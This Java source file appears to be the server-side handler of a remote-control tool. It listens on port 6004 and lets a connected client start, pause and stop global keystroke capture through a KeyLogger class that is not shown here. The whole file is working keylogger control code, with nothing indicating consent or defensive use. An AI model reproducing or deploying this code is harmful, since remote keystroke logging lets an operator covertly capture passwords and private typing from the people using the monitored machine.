package Server;

import Function.KeyLogger;
import com.github.kwhat.jnativehook.GlobalScreen;

import java.net.ServerSocket;
import java.net.Socket;

public class HandleKeyLogger implements Runnable, SendRecv {
    @Override
    public void run() {
        ServerSocket ss;
        try {
            ss = new ServerSocket(6004);
            Socket s = ss.accept();
            String option;
            KeyLogger kl = new KeyLogger(s);
            do {
                option = SendRecv.getMess(s);
                if (option.equals("Start")) {
                    kl.startKeyLog();
                } else if (option.equals("Pause")) {
                    kl.stopKeyLogger();
                }
            } while (!option.equals("Stop"));
            if (kl.isStart) {
                kl.stopKeyLogger();
                GlobalScreen.unregisterNativeHook();
            }
            s.close();
            ss.close();
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
}
